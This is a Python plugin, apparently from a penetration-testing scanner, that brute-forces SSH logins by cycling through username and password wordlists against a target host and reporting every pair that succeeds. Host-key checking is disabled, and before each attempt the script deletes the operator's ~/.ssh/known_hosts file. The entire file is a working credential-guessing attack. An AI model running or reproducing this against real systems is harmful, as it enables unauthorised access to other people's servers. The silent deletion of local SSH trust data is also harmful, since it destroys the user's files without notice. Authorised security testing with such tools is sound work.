#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven
import traceback

import asyncssh
from lib.core.env import *
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.SSH

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("ssh_usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("ssh_passwords.txt")

    async def prove(self):
        if self.base_url is None:
            try:
                async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list):
                    known_hosts_path = os.path.join(os.path.expanduser('~'), '.ssh', 'known_hosts')
                    if os.path.exists(known_hosts_path):
                        os.remove(known_hosts_path)
                    try:
                        async with asyncssh.connect(host=self.host, port=self.port, username=username, password=password, known_hosts=None) as conn:
                            yield username + "/" + password
                            
                    except asyncssh.misc.PermissionDenied:
                        pass
                    except:
                        pass
            except:
                pass